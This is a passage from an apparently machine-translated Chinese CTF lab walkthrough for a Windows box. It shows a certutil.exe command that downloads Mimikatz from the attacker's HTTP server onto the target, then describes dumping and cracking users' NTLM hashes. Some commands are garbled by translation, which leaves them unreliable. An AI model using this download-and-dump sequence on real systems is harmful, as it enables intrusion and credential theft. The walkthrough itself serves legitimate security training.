translated">这里最大的问题是，如何在服务器上安装Mimikatz，因为我们没有Netcat和Curl这样的服务来下载文件？。</p><p id="35b2" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">为此，我们将使用<strong class="lq ir">Certutil.exe</strong>这是<strong class="lq ir">一个命令行程序</strong>，作为证书服务的一部分安装。我们可以用它从其他服务器获取文件</p><p id="c6d8" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">我们将首先在当前目录中获取x86版本的Mimikatz，然后启动一个简单的python HTTP服务器。然后在目标机器上设置certutil.exe来获取我们的托管文件。使用以下命令启动Certutil。</p><blockquote class="pd pe pf"><p id="5366" class="lo lp mw lq b lr mx jr lt lu my ju lw pg mz lz ma ph na md me pi nb mh mi mj ij bi translated">$ CP/usr/share/mimikatz/Win32/mimikatz . exe。</p></blockquote><p id="5141" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated"><strong class="lq ir">certutil.exe-URL cache-f</strong><a class="ae mk" href="http://10.17.11.91:8000/mimikatz.exe" rel="noopener ugc nofollow" target="_blank"><strong class="lq ir">http://YOUR _ IP:8000/mimikatz . exe</strong></a><strong class="lq ir">mimi.exe</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pj"><img src="../Images/b988bc969738656313d3a93c38a3a796.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*u0phBnaECiKVwKg9O0MAdg.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">来自目标机器的HTTP交互</figcaption></figure><p id="1f81" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">现在我们可以运行Mimikatz来转储机器上所有用户的NTLM散列</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pk"><img src="../Images/d0085f669d739427c39af0659fed084a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lJlbmDNUbHWmAvuAuJhZPA.jpeg"/></div></div></figure><p id="f508" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">去像<a class="ae mk" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank"> Crackstation </a>这样的网站破解哈希值。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/894fd423e85f89142cea77f5a61e09a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*u0XiVOgQTIX-yhqAmxu25w.png"/></div></figure><p id="c352" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">最后，我们需要获得root.txt标志。这通常在管理员的桌面上。更改那里的目录向我们展示了标志文件。使用<strong class="lq ir"> more </strong>命令显示内容，并提交给仪表板。</p><blockquote class="pd pe pf"><p id="6c15" class="lo lp mw lq b lr mx jr lt lu my ju lw pg mz lz ma ph na md me pi nb mh mi mj ij bi translated">光盘C:\用户\管理员\桌面</p><p id="d57f" class="lo lp mw lq b lr mx jr lt lu my ju lw pg mz lz ma ph na md me pi nb mh mi mj ij bi translated">更多root.txt.txt</p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/fd56bf88b6669fc612525927e0ac2a9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:820/format:webp/1*dcDICcXo2Yl26fm8Svdb1A.png"/></div></figure><blockquote class="pm"><p id="e367" class="pn po iq bd pp pq pr ps pt pu pv mj dk translated">恭喜你完成了房间！💥</p></blockquote><p id="521c" class="pw-post-body-paragraph lo lp iq lq b lr pw jr lt lu px ju lw lx py lz ma mb pz md me mf qa mh mi mj ij bi translated"><strong class="lq ir">蓝图</strong>是一个很好的机会来利用通常容易的元漏洞利用，并使用一个较少使用的<strong class="lq ir">手动利用</strong>来完成。Mimikatz是一个非常强大的工具，可以在许多方面加以利用，我鼓励你自己去了解它。我希望这篇漫游指南对你有所帮助，下次再见！</p></div></div>    
</body>
</html>